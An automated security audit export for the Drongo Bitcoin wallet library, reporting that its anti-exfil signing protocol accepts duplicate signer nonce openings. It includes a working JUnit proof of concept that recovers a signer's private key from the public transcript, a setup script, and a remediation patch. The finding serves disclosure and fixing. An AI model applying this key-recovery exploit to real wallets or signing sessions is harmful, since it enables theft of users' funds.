# Historical automated audit export (pre-remediation input)

This is the substantive export from the V12 scan of Drongo
`1bbafd94f08fd9105e20be30a6fdfe9a091fb675`. Finding validity and severity in
this file are scanner output, not maintainer conclusions. Independent triage,
dispositions, implementation ranges, and review results are authoritative in
`security-review-findings.md` Phases 10–15 and the Gate briefs.

# Audited by [V12](https://v12.sh/)
The only autonomous auditor that finds critical bugs. Not all audits are equal, so stop paying for bad ones. Just use V12. No calls, demos, or intros.
# Duplicate openings expose the signing key
**#247985**
- Severity: Critical
- Validity: Unreviewed
## Source locations
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCodec.java`
#### Lines 111-133 — _Cross-slot sets reject duplicate commitments and reveals, but no set tracks openings._

```
    public static void validate(AntiExfilMessage message) {
        if(message == null || message.getNetwork() == null || message.getStage() == null
                || length(message.getSessionId()) != 32 || length(message.getPsbtDigest()) != 32
                || message.getSlots() == null || message.getSlots().isEmpty() || message.getSlots().size() > MAX_SLOTS) {
            throw fail(INVALID_MESSAGE, "Invalid AEXB message header");
        }
        Set<Bytes> commitments = new HashSet<>();
        Set<Bytes> reveals = new HashSet<>();
        long previousInput = -1;
        byte[] previousKey = null;
        int perInput = 0;
        for(AntiExfilSlot slot : message.getSlots()) {
            validateSlot(message.getStage(), slot);
            int order = previousKey == null ? 1 : compareIdentifier(previousInput, previousKey, slot.getInputIndex(), slot.getSignerPublicKey());
            if(order >= 0 && previousKey != null) throw fail(SIGNATURE_SLOT_MISMATCH, "Slots are not uniquely ordered");
            perInput = slot.getInputIndex() == previousInput ? perInput + 1 : 1;
            if(perInput > MAX_SLOTS_PER_INPUT) throw fail(SIGNATURE_SLOT_MISMATCH, "Input exceeds the slot limit");
            if(!commitments.add(new Bytes(slot.getCommitment()))) throw fail(COMMITMENT_MISMATCH, "Duplicate host commitment");
            if(slot.getHostRandomness() != null && !reveals.add(new Bytes(slot.getHostRandomness()))) throw fail(COMMITMENT_MISMATCH, "Duplicate host reveal");
            previousInput = slot.getInputIndex();
            previousKey = slot.getSignerPublicKey();
        }
    }
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java`
#### Lines 120-149 — _The coordinator releases every rho after accepting openings without a uniqueness check._

```
    public byte[] acceptOpenings(byte[] encodedOpenings) {
        if(encodedOpenings == null) throw fail(INVALID_MESSAGE, "Signer openings are required");
        return AntiExfilDurableFiles.locked(sessionPath, () -> {
            State state = readValidatedStateUnlocked();
            if(state.phase == Phase.COMPLETE || state.phase == Phase.OPENINGS_ACCEPTED) {
                if(!Arrays.equals(encodedOpenings, state.message2)) throw fail(RETRY_CONFLICT, "Retry changed accepted signer openings");
                return state.message3.clone();
            }
            AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
            AntiExfilMessage openings = AntiExfilCodec.decode(encodedOpenings);
            if(openings.getStage() != AntiExfilStage.SIGNER_OPENINGS) throw fail(WRONG_STAGE, "Expected signer openings");
            AntiExfilCodec.validateTransition(commit, openings);
            List<AntiExfilSlot> revealSlots = new ArrayList<>(openings.getSlots().size());
            for(AntiExfilSlot slot : openings.getSlots()) {
                AntiExfilSigningSlot.Identifier identifier = identifier(slot);
                byte[] rho = state.rhos.get(identifier);
                if(rho == null) throw fail(SIGNATURE_SLOT_MISMATCH, "Opening has no authoritative host-randomness slot");
                revealSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                        slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), rho, null));
            }
            AntiExfilMessage reveal = new AntiExfilMessage(openings.getNetwork(), AntiExfilStage.HOST_REVEAL,
                    openings.getSessionId(), openings.getPsbtDigest(), revealSlots);
            AntiExfilCodec.validateTransition(openings, reveal);
            byte[] message3 = AntiExfilCodec.encode(reveal);
            State accepted = new State(Phase.OPENINGS_ACCEPTED, state.walletIdentity, state.originalPsbt,
                    state.message1, encodedOpenings, message3, null, null, state.rhos);
            // This durable write is the security boundary: no rho is returned before it succeeds.
            AntiExfilDurableFiles.write(sessionPath, encode(accepted), false);
            return message3.clone();
        });
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCrypto.java`
#### Lines 27-48 — _Verification derives and checks one opening-plus-rho nonce relation at a time._

```
    public static boolean verify(byte[] publicKey, byte[] messageHash, byte[] hostRandomness,
                                 byte[] opening, byte[] compactSignature) {
        if(length(publicKey) != 33 || length(messageHash) != 32 || length(hostRandomness) != 32
                || length(opening) != 33 || length(compactSignature) != 64) return false;
        try {
            ECPoint openingPoint = ECKey.CURVE.getCurve().decodePoint(opening).normalize();
            if(openingPoint.isInfinity()) return false;
            byte[] tweakHash = Utils.taggedHash(POINT_TAG, Utils.concat(openingPoint.getEncoded(true), hostRandomness));
            BigInteger tweak = new BigInteger(1, tweakHash);
            if(tweak.compareTo(ECKey.CURVE.getN()) >= 0) return false;
            ECPoint committedPoint = openingPoint.add(ECKey.CURVE.getG().multiply(tweak)).normalize();
            if(committedPoint.isInfinity()) return false;
            BigInteger r = new BigInteger(1, Arrays.copyOfRange(compactSignature, 0, 32));
            BigInteger s = new BigInteger(1, Arrays.copyOfRange(compactSignature, 32, 64));
            if(r.signum() <= 0 || r.compareTo(ECKey.CURVE.getN()) >= 0 || s.signum() <= 0 || s.compareTo(ECKey.HALF_CURVE_ORDER) > 0) return false;
            if(!committedPoint.getAffineXCoord().toBigInteger().mod(ECKey.CURVE.getN()).equals(r)) return false;
            TransactionSignature signature = new TransactionSignature(new ECDSASignature(r, s), SigHash.ALL);
            return ECKey.fromPublicOnly(publicKey).verify(messageHash, signature);
        } catch(Exception e) {
            return false;
        }
    }
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java`
#### Lines 95-101 — _Slot identity permits the same signer key on different input indices._

```
        Set<AntiExfilSigningSlot.Identifier> identifiers = new HashSet<>();
        Map<Integer, Integer> perInput = new LinkedHashMap<>();
        for(AntiExfilSigningSlot slot : slots) {
            if(!identifiers.add(slot.getIdentifier())) throw fail(SIGNATURE_SLOT_MISMATCH, "Duplicate signing slot");
            int count = perInput.merge(slot.getInputIndex(), 1, Integer::sum);
            if(count > AntiExfilCodec.MAX_SLOTS_PER_INPUT) failInput(slot.getInputIndex(), "input exceeds the per-input slot limit");
        }
```
## Description

`AntiExfilCodec.validate` rejects duplicate host commitments and host reveals but never rejects duplicate signer opening points. Two different input slots may legitimately use the same signer public key because slot identity also includes the input index, so a signer can return one opening point for both slots and pass every transition check. `acceptOpenings` then releases distinct host randomness values, and final verification checks each opening/signature tuple independently without detecting reuse. For nonce scalars `k1 = k0 + t1` and `k2 = k0 + t2`, the public transcript reveals the known offset `k1-k2 = t1-t2`; the two ECDSA equations then recover the private key, with low-S normalization producing only four candidates that are testable against the public key. The coordinator nevertheless emits `VerifiedAntiExfilSignature` evidence for the leaking ceremony.
## Root cause

Cross-slot uniqueness is enforced for host-controlled values but not for signer-controlled opening points, while all final cryptographic checks operate on one slot at a time.
## Impact

Anyone who obtains the AEXB transcript and signatures can recover a reused signer's private key, allowing theft of all funds controlled by that key. A malicious signer can use this as the exact exfiltration channel the protocol is intended to prevent, and an accidental nonce-opening reuse has the same result.
## Proof of concept
### Test case

```
package com.sparrowwallet.drongo.antiexfil;

import com.sparrowwallet.drongo.KeyDerivation;
import com.sparrowwallet.drongo.Utils;
import com.sparrowwallet.drongo.crypto.ECKey;
import com.sparrowwallet.drongo.policy.PolicyType;
import com.sparrowwallet.drongo.protocol.Script;
import com.sparrowwallet.drongo.protocol.ScriptType;
import com.sparrowwallet.drongo.protocol.TransactionOutput;
import com.sparrowwallet.drongo.psbt.PSBT;
import com.sparrowwallet.drongo.psbt.PSBTInput;
import com.sparrowwallet.drongo.wallet.DeterministicSeed;
import com.sparrowwallet.drongo.wallet.Keystore;
import org.bouncycastle.math.ec.ECPoint;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.io.InputStream;
import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.*;

class Poc {
    private static final String WORDS = "model ensure search plunge galaxy firm exclude brain satoshi meadow cable roast";
    private static final Pattern STRING_FIELD = Pattern.compile("\\\"%s\\\"\\s*:\\s*\\\"([0-9a-f]+)\\\"");
    private static final String POINT_TAG = "s2c/ecdsa/point";

    @TempDir
    Path temporary;

    @Test
    void duplicateSignerOpeningAcceptedThenTranscriptRecoversPrivateKey() throws Exception {
        Keystore keystore = keystore();
        byte[] vulnerablePsbt = psbtWithSameSignerKeyOnTwoInputs(loadVector("protocol-v1-semantic-psbt-vector.json"));
        List<AntiExfilSigningSlot> signingSlots = AntiExfilPsbt.enumerateSigningSlots(vulnerablePsbt, keystore);
        assertTrue(signingSlots.size() >= 2);
        assertArrayEquals(signingSlots.get(0).getSignerPublicKey(), signingSlots.get(1).getSignerPublicKey(),
                "fixture mutation must create two independent slots for the same signing key");
        assertNotEquals(signingSlots.get(0).getInputIndex(), signingSlots.get(1).getInputIndex(),
                "slot identity includes input index, so this is not a duplicate slot identifier");

        AntiExfilCoordinator coordinator = AntiExfilCoordinator.create(temporary.resolve("session.aexs"),
                temporary.resolve("wallet.aexj"), vulnerablePsbt, keystore, AntiExfilNetwork.TESTNET4);
        AntiExfilMessage commit = AntiExfilCodec.decode(coordinator.getHostCommitMessage());

        BigInteger reusedOpeningScalar = BigInteger.valueOf(42);
        byte[] reusedOpening = ECKey.CURVE.getG().multiply(reusedOpeningScalar).normalize().getEncoded(true);
        AntiExfilMessage duplicateOpenings = signerOpenings(commit, reusedOpening);
        assertArrayEquals(duplicateOpenings.getSlots().get(0).getOpening(), duplicateOpenings.getSlots().get(1).getOpening(),
                "the malicious signer reuses the same pre-tweak nonce point in both same-key slots");

        byte[] revealBytes = coordinator.acceptOpenings(AntiExfilCodec.encode(duplicateOpenings));
        AntiExfilMessage reveal = AntiExfilCodec.decode(revealBytes);
        assertArrayEquals(reusedOpening, reveal.getSlots().get(0).getOpening());
        assertArrayEquals(reusedOpening, reveal.getSlots().get(1).getOpening());
        assertFalse(Arrays.equals(reveal.getSlots().get(0).getHostRandomness(), reveal.getSlots().get(1).getHostRandomness()),
                "the coordinator discloses distinct host tweaks for the reused signer opening");

        AntiExfilMessage signatures = signerSignatures(reveal, signingSlots, keystore, reusedOpeningScalar);
        AntiExfilCoordinator.Completion completion = coordinator.complete(AntiExfilCodec.encode(signatures));
        assertEquals(signingSlots.size(), completion.getVerifiedSignatures().size(),
                "the coordinator completes and emits verified evidence despite the reused signer opening");

        BigInteger recovered = recoverPrivateKeyFromPublicTranscript(signatures.getSlots().get(0), reveal.getSlots().get(0).getHostRandomness(),
                signatures.getSlots().get(1), reveal.getSlots().get(1).getHostRandomness());
        BigInteger actual = privateKeyFor(signingSlots.get(0), keystore).getPrivKey();
        assertEquals(actual, recovered, "the public transcript with a duplicate opening reveals the signer private key");
        assertArrayEquals(signingSlots.get(0).getSignerPublicKey(), ECKey.fromPrivate(recovered, true).getPubKey());
    }

    private static byte[] psbtWithSameSignerKeyOnTwoInputs(String vector) throws Exception {
        PSBT psbt = AntiExfilPsbt.parseCanonicalV0(Utils.hexToBytes(field(vector, "psbt_hex")));
        PSBTInput source = psbt.getPsbtInputs().get(0);
        Map.Entry<ECKey, KeyDerivation> reused = source.getDerivedPublicKeys().entrySet().iterator().next();

        PSBTInput target = psbt.getPsbtInputs().get(1);
        Script p2wpkhRedeemScript = ScriptType.P2WPKH.getOutputScript(reused.getKey().getPubKeyHash());
        target.setRedeemScript(p2wpkhRedeemScript);
        target.setWitnessScript(null);
        target.setWitnessUtxo(new TransactionOutput(null, target.getUtxo().getValue(),
                ScriptType.P2SH_P2WPKH.getOutputScript(PolicyType.SINGLE_HD, reused.getKey())));
        target.getDerivedPublicKeys().clear();
        target.getDerivedPublicKeys().put(reused.getKey(), reused.getValue());
        return AntiExfilPsbt.parseCanonicalV0(psbt.serialize()).serialize();
    }

    private static AntiExfilMessage signerOpenings(AntiExfilMessage commit, byte[] reusedOpening) {
        List<AntiExfilSlot> slots = new ArrayList<>();
        for(int i = 0; i < commit.getSlots().size(); i++) {
            AntiExfilSlot slot = commit.getSlots().get(i);
            byte[] opening = i < 2 ? reusedOpening : ECKey.CURVE.getG().multiply(BigInteger.valueOf(100 + i)).normalize().getEncoded(true);
            slots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), opening, null, null));
        }
        return new AntiExfilMessage(commit.getNetwork(), AntiExfilStage.SIGNER_OPENINGS,
                commit.getSessionId(), commit.getPsbtDigest(), slots);
    }

    private static AntiExfilMessage signerSignatures(AntiExfilMessage reveal, List<AntiExfilSigningSlot> signingSlots,
                                                     Keystore keystore, BigInteger reusedOpeningScalar) throws Exception {
        List<AntiExfilSlot> slots = new ArrayList<>();
        for(int i = 0; i < reveal.getSlots().size(); i++) {
            AntiExfilSlot slot = reveal.getSlots().get(i);
            BigInteger openingScalar = i < 2 ? reusedOpeningScalar : BigInteger.valueOf(100 + i);
            byte[] signature = signWithTweakedNonce(privateKeyFor(signingSlots.get(i), keystore).getPrivKey(),
                    slot.getMessageHash(), slot.getOpening(), slot.getHostRandomness(), openingScalar);
            slots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), null, signature));
        }
        return new AntiExfilMessage(reveal.getNetwork(), AntiExfilStage.SIGNER_SIGNATURES,
                reveal.getSessionId(), reveal.getPsbtDigest(), slots);
    }

    private static byte[] signWithTweakedNonce(BigInteger privateKey, byte[] messageHash, byte[] opening,
                                               byte[] hostRandomness, BigInteger openingScalar) {
        BigInteger n = ECKey.CURVE.getN();
        BigInteger tweak = tweak(opening, hostRandomness);
        BigInteger nonce = openingScalar.add(tweak).mod(n);
        ECPoint point = ECKey.CURVE.getG().multiply(nonce).normalize();
        BigInteger r = point.getAffineXCoord().toBigInteger().mod(n);
        BigInteger z = new BigInteger(1, messageHash);
        BigInteger s = nonce.modInverse(n).multiply(z.add(r.multiply(privateKey))).mod(n);
        if(s.compareTo(ECKey.HALF_CURVE_ORDER) > 0) s = n.subtract(s);
        return Utils.concat(Utils.bigIntegerToBytes(r, 32), Utils.bigIntegerToBytes(s, 32));
    }

    private static BigInteger recoverPrivateKeyFromPublicTranscript(AntiExfilSlot first, byte[] firstRho,
                                                                    AntiExfilSlot second, byte[] secondRho) {
        BigInteger n = ECKey.CURVE.getN();
        BigInteger r1 = scalar(first.getSignature(), 0);
        BigInteger r2 = scalar(second.getSignature(), 0);
        BigInteger z1 = new BigInteger(1, first.getMessageHash());
        BigInteger z2 = new BigInteger(1, second.getMessageHash());
        BigInteger t1 = tweak(first.getOpening(), firstRho);
        BigInteger t2 = tweak(second.getOpening(), secondRho);
        BigInteger observedS1 = scalar(first.getSignature(), 32);
        BigInteger observedS2 = scalar(second.getSignature(), 32);

        for(BigInteger s1 : List.of(observedS1, n.subtract(observedS1))) {
            for(BigInteger s2 : List.of(observedS2, n.subtract(observedS2))) {
                BigInteger left = r1.multiply(s1.modInverse(n)).subtract(r2.multiply(s2.modInverse(n))).mod(n);
                if(left.signum() == 0) continue;
                BigInteger right = t1.subtract(t2)
                        .subtract(z1.multiply(s1.modInverse(n)))
                        .add(z2.multiply(s2.modInverse(n))).mod(n);
                BigInteger candidate = right.multiply(left.modInverse(n)).mod(n);
                if(Arrays.equals(ECKey.fromPrivate(candidate, true).getPubKey(), first.getSignerPublicKey())) {
                    return candidate;
                }
            }
        }
        fail("no private-key candidate matched the public key");
        return BigInteger.ZERO;
    }

    private static BigInteger tweak(byte[] opening, byte[] hostRandomness) {
        BigInteger tweak = new BigInteger(1, Utils.taggedHash(POINT_TAG, Utils.concat(opening, hostRandomness)));
        assertTrue(tweak.compareTo(ECKey.CURVE.getN()) < 0, "host randomness produced an invalid anti-exfil tweak");
        return tweak;
    }

    private static BigInteger scalar(byte[] compactSignature, int offset) {
        return new BigInteger(1, Arrays.copyOfRange(compactSignature, offset, offset + 32));
    }

    private static ECKey privateKeyFor(AntiExfilSigningSlot slot, Keystore keystore) throws Exception {
        return ECKey.fromPrivate(keystore.getExtendedMasterPrivateKey()
                .getKey(slot.getKeyDerivation().getDerivation()).getPrivKeyBytes(), true);
    }

    private static String loadVector(String resource) throws IOException {
        try(InputStream stream = Poc.class.getResourceAsStream(resource)) {
            assertNotNull(stream, "Missing test vector " + resource);
            return new String(stream.readAllBytes(), StandardCharsets.UTF_8);
        }
    }

    private static String field(String vector, String name) {
        Matcher matcher = Pattern.compile(STRING_FIELD.pattern().formatted(Pattern.quote(name))).matcher(vector);
        assertTrue(matcher.find(), "Missing vector field " + name);
        return matcher.group(1);
    }

    private static Keystore keystore() throws Exception {
        DeterministicSeed seed = new DeterministicSeed(WORDS, "", 0, DeterministicSeed.Type.BIP39);
        return Keystore.fromSeed(seed, PolicyType.SINGLE_HD, KeyDerivation.parsePath("m/84'/1'/0'"));
    }
}
```
### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   src/test/java/com/sparrowwallet/drongo/antiexfil/Poc.java

# build and run
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew testClasses
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --rerun-tasks --tests 'com.sparrowwallet.drongo.antiexfil.Poc'
```
### Output

```
[output truncated: 11 lines & 0.7333984375 KB skipped]
> Task :processResources
> Task :classes
> Task :compileTestJava
> Task :processTestResources
> Task :testClasses
> Task :test

BUILD SUCCESSFUL in 11s
5 actionable tasks: 5 executed
Consider enabling configuration cache to speed up this build: https://docs.gradle.org/9.1.0/userguide/configuration_cache_enabling.html
```
### Considerations

PoC is a JUnit unit test in the native Gradle/JVM harness. It mutates the existing semantic PSBT fixture to create two valid public coordinator signing slots for the same key, drives AntiExfilCoordinator.create -> acceptOpenings -> complete through real code, proves duplicate openings are accepted, proves verified completion evidence is emitted, and recovers the actual signer private key from the public transcript. Verified with `JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --rerun-tasks --tests 'com.sparrowwallet.drongo.antiexfil.Poc'`; Gradle executed all tasks and JUnit XML reported tests=1, skipped=0, failures=0, errors=0 for `duplicateSignerOpeningAcceptedThenTranscriptRecoversPrivateKey()`.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Track signer opening points across all slots during AEXB validation and reject duplicate points with OPENING_MISMATCH, preventing acceptance before distinct host randomness is revealed.
### Patch

```diff
diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCodec.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCodec.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCodec.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCodec.java
@@ -1,186 +1,188 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import com.sparrowwallet.drongo.crypto.ECKey;
 
 import java.math.BigInteger;
 import java.nio.ByteBuffer;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashSet;
 import java.util.List;
 import java.util.Set;
 
 import static com.sparrowwallet.drongo.antiexfil.AntiExfilException.Code.*;
 
 public final class AntiExfilCodec {
     public static final byte[] MAGIC = {'A', 'E', 'X', 'B'};
     public static final int FORMAT_VERSION = 1;
     public static final long SIGHASH_ALL = 1;
     public static final int MAX_SLOTS = 128;
     public static final int MAX_SLOTS_PER_INPUT = 16;
     public static final int MAX_MESSAGE_BYTES = 65_536;
     public static final int HEADER_LENGTH = 78;
     public static final int COMMON_RECORD_LENGTH = 105;
 
     private AntiExfilCodec() {
     }
 
     public static byte[] encode(AntiExfilMessage message) {
         validate(message);
         int payloadLength = Math.multiplyExact(message.getSlots().size(), message.getStage().getRecordLength());
         ByteBuffer buffer = ByteBuffer.allocate(HEADER_LENGTH + payloadLength);
         buffer.put(MAGIC).put((byte)FORMAT_VERSION).put((byte)message.getNetwork().getCode())
                 .put((byte)message.getStage().getCode()).put((byte)0).putInt(payloadLength)
                 .put(message.getSessionId()).put(message.getPsbtDigest()).putShort((short)message.getSlots().size());
         for(AntiExfilSlot slot : message.getSlots()) {
             buffer.putInt((int)slot.getInputIndex()).putInt((int)slot.getSighashType())
                     .put(slot.getSignerPublicKey()).put(slot.getMessageHash()).put(slot.getCommitment());
             if(message.getStage().getCode() >= AntiExfilStage.SIGNER_OPENINGS.getCode()) buffer.put(slot.getOpening());
             if(message.getStage() == AntiExfilStage.HOST_REVEAL) buffer.put(slot.getHostRandomness());
             if(message.getStage() == AntiExfilStage.SIGNER_SIGNATURES) buffer.put(slot.getSignature());
         }
         return buffer.array();
     }
 
     public static AntiExfilMessage decode(byte[] encoded) {
         if(encoded == null || encoded.length < HEADER_LENGTH || encoded.length > MAX_MESSAGE_BYTES) {
             throw fail(INVALID_MESSAGE, "AEXB message length is outside v1 limits");
         }
         ByteBuffer buffer = ByteBuffer.wrap(encoded);
         byte[] magic = new byte[4];
         buffer.get(magic);
         if(!Arrays.equals(magic, MAGIC)) throw fail(INVALID_MESSAGE, "Wrong AEXB magic");
         if(Byte.toUnsignedInt(buffer.get()) != FORMAT_VERSION) throw fail(INVALID_MESSAGE, "Unsupported AEXB version");
         AntiExfilNetwork network = AntiExfilNetwork.fromCode(Byte.toUnsignedInt(buffer.get()));
         AntiExfilStage stage = AntiExfilStage.fromCode(Byte.toUnsignedInt(buffer.get()));
         if(buffer.get() != 0) throw fail(INVALID_MESSAGE, "Unknown AEXB flags are set");
         long payloadLength = Integer.toUnsignedLong(buffer.getInt());
         byte[] sessionId = new byte[32];
         byte[] psbtDigest = new byte[32];
         buffer.get(sessionId).get(psbtDigest);
         int slotCount = Short.toUnsignedInt(buffer.getShort());
         if(slotCount < 1 || slotCount > MAX_SLOTS) throw fail(INVALID_MESSAGE, "AEXB slot count is outside v1 limits");
         long expectedPayload = (long)slotCount * stage.getRecordLength();
         if(payloadLength != expectedPayload || encoded.length != HEADER_LENGTH + expectedPayload) {
             throw fail(INVALID_MESSAGE, "AEXB payload length is not canonical for its stage");
         }
         List<AntiExfilSlot> slots = new ArrayList<>(slotCount);
         for(int i = 0; i < slotCount; i++) {
             long inputIndex = Integer.toUnsignedLong(buffer.getInt());
             long sighash = Integer.toUnsignedLong(buffer.getInt());
             byte[] publicKey = read(buffer, 33);
             byte[] messageHash = read(buffer, 32);
             byte[] commitment = read(buffer, 32);
             byte[] opening = stage.getCode() >= AntiExfilStage.SIGNER_OPENINGS.getCode() ? read(buffer, 33) : null;
             byte[] rho = stage == AntiExfilStage.HOST_REVEAL ? read(buffer, 32) : null;
             byte[] signature = stage == AntiExfilStage.SIGNER_SIGNATURES ? read(buffer, 64) : null;
             slots.add(new AntiExfilSlot(inputIndex, sighash, publicKey, messageHash, commitment, opening, rho, signature));
         }
         AntiExfilMessage message = new AntiExfilMessage(network, stage, sessionId, psbtDigest, slots);
         validate(message);
         return message;
     }
 
     public static void validateTransition(AntiExfilMessage previous, AntiExfilMessage current) {
         if(current.getStage().getCode() != previous.getStage().getCode() + 1) throw fail(WRONG_STAGE, "Stages are not adjacent");
         if(previous.getNetwork() != current.getNetwork()
                 || !Arrays.equals(previous.getSessionId(), current.getSessionId())
                 || !Arrays.equals(previous.getPsbtDigest(), current.getPsbtDigest())) {
             throw fail(TRANSACTION_MISMATCH, "Transcript context changed between stages");
         }
         if(previous.getSlots().size() != current.getSlots().size()) throw fail(SIGNATURE_SLOT_MISMATCH, "Slot count changed");
         for(int i = 0; i < previous.getSlots().size(); i++) {
             AntiExfilSlot before = previous.getSlots().get(i);
             AntiExfilSlot after = current.getSlots().get(i);
             if(before.getInputIndex() != after.getInputIndex()
                     || before.getSighashType() != after.getSighashType()
                     || !Arrays.equals(before.getSignerPublicKey(), after.getSignerPublicKey())
                     || !Arrays.equals(before.getMessageHash(), after.getMessageHash())) {
                 throw fail(SIGNATURE_SLOT_MISMATCH, "Slot identity or signing context changed");
             }
             if(!Arrays.equals(before.getCommitment(), after.getCommitment())) throw fail(COMMITMENT_MISMATCH, "Commitment changed");
             if(previous.getStage().getCode() >= AntiExfilStage.SIGNER_OPENINGS.getCode()
                     && !Arrays.equals(before.getOpening(), after.getOpening())) throw fail(OPENING_MISMATCH, "Accepted opening changed");
             if(current.getStage() == AntiExfilStage.HOST_REVEAL
                     && !Arrays.equals(AntiExfilCrypto.hostCommit(after.getHostRandomness()), after.getCommitment())) {
                 throw fail(COMMITMENT_MISMATCH, "Host reveal does not match commitment");
             }
         }
     }
 
     public static void validate(AntiExfilMessage message) {
         if(message == null || message.getNetwork() == null || message.getStage() == null
                 || length(message.getSessionId()) != 32 || length(message.getPsbtDigest()) != 32
                 || message.getSlots() == null || message.getSlots().isEmpty() || message.getSlots().size() > MAX_SLOTS) {
             throw fail(INVALID_MESSAGE, "Invalid AEXB message header");
         }
         Set<Bytes> commitments = new HashSet<>();
+        Set<Bytes> openings = new HashSet<>();
         Set<Bytes> reveals = new HashSet<>();
         long previousInput = -1;
         byte[] previousKey = null;
         int perInput = 0;
         for(AntiExfilSlot slot : message.getSlots()) {
             validateSlot(message.getStage(), slot);
             int order = previousKey == null ? 1 : compareIdentifier(previousInput, previousKey, slot.getInputIndex(), slot.getSignerPublicKey());
             if(order >= 0 && previousKey != null) throw fail(SIGNATURE_SLOT_MISMATCH, "Slots are not uniquely ordered");
             perInput = slot.getInputIndex() == previousInput ? perInput + 1 : 1;
             if(perInput > MAX_SLOTS_PER_INPUT) throw fail(SIGNATURE_SLOT_MISMATCH, "Input exceeds the slot limit");
             if(!commitments.add(new Bytes(slot.getCommitment()))) throw fail(COMMITMENT_MISMATCH, "Duplicate host commitment");
+            if(slot.getOpening() != null && !openings.add(new Bytes(slot.getOpening()))) throw fail(OPENING_MISMATCH, "Duplicate signer opening");
             if(slot.getHostRandomness() != null && !reveals.add(new Bytes(slot.getHostRandomness()))) throw fail(COMMITMENT_MISMATCH, "Duplicate host reveal");
             previousInput = slot.getInputIndex();
             previousKey = slot.getSignerPublicKey();
         }
     }
 
     private static void validateSlot(AntiExfilStage stage, AntiExfilSlot slot) {
         if(slot == null || slot.getInputIndex() < 0 || slot.getInputIndex() > 0xffff_ffffL || slot.getSighashType() != SIGHASH_ALL) {
             throw fail(INVALID_MESSAGE, "Invalid slot index or sighash");
         }
         requirePoint(slot.getSignerPublicKey(), "signer public key");
         requireLength(slot.getMessageHash(), 32, "message hash");
         requireLength(slot.getCommitment(), 32, "host commitment");
         boolean needsOpening = stage.getCode() >= AntiExfilStage.SIGNER_OPENINGS.getCode();
         if((slot.getOpening() != null) != needsOpening) throw fail(INVALID_MESSAGE, "Opening presence conflicts with stage");
         if((slot.getHostRandomness() != null) != (stage == AntiExfilStage.HOST_REVEAL)) throw fail(INVALID_MESSAGE, "Reveal presence conflicts with stage");
         if((slot.getSignature() != null) != (stage == AntiExfilStage.SIGNER_SIGNATURES)) throw fail(INVALID_MESSAGE, "Signature presence conflicts with stage");
         if(slot.getOpening() != null) requirePoint(slot.getOpening(), "signer opening");
         if(slot.getHostRandomness() != null) requireLength(slot.getHostRandomness(), 32, "host reveal");
         if(slot.getSignature() != null) {
             requireLength(slot.getSignature(), 64, "compact signature");
             BigInteger r = new BigInteger(1, Arrays.copyOfRange(slot.getSignature(), 0, 32));
             BigInteger s = new BigInteger(1, Arrays.copyOfRange(slot.getSignature(), 32, 64));
             if(r.signum() <= 0 || r.compareTo(ECKey.CURVE.getN()) >= 0 || s.signum() <= 0 || s.compareTo(ECKey.HALF_CURVE_ORDER) > 0) {
                 throw fail(INVALID_MESSAGE, "Signature scalars are invalid or non-low-S");
             }
         }
     }
 
     private static int compareIdentifier(long leftIndex, byte[] leftKey, long rightIndex, byte[] rightKey) {
         int indexComparison = Long.compare(leftIndex, rightIndex);
         if(indexComparison != 0) return indexComparison;
         return Arrays.compareUnsigned(leftKey, rightKey);
     }
 
     private static void requirePoint(byte[] point, String name) {
         requireLength(point, 33, name);
         if(point[0] != 2 && point[0] != 3) throw fail(INVALID_MESSAGE, name + " is not compressed");
         try {
             if(ECKey.CURVE.getCurve().decodePoint(point).isInfinity()) throw fail(INVALID_MESSAGE, name + " is infinity");
         } catch(IllegalArgumentException e) {
             throw new AntiExfilException(INVALID_MESSAGE, name + " is not a secp256k1 point", e);
         }
     }
 
     private static void requireLength(byte[] value, int expected, String name) {
         if(length(value) != expected) throw fail(INVALID_MESSAGE, name + " must be exactly " + expected + " bytes");
     }
 
     private static int length(byte[] value) { return value == null ? -1 : value.length; }
     private static byte[] read(ByteBuffer buffer, int length) { byte[] value = new byte[length]; buffer.get(value); return value; }
     private static AntiExfilException fail(AntiExfilException.Code code, String message) { return new AntiExfilException(code, message); }
 
     private record Bytes(byte[] value) {
         @Override public boolean equals(Object object) { return object instanceof Bytes other && Arrays.equals(value, other.value); }
         @Override public int hashCode() { return Arrays.hashCode(value); }
     }
 }
```
### Affected files
- `src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCodec.java`
### Validation output

```
[output truncated: 28 lines & 0.8310546875 KB skipped]
FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':test'.
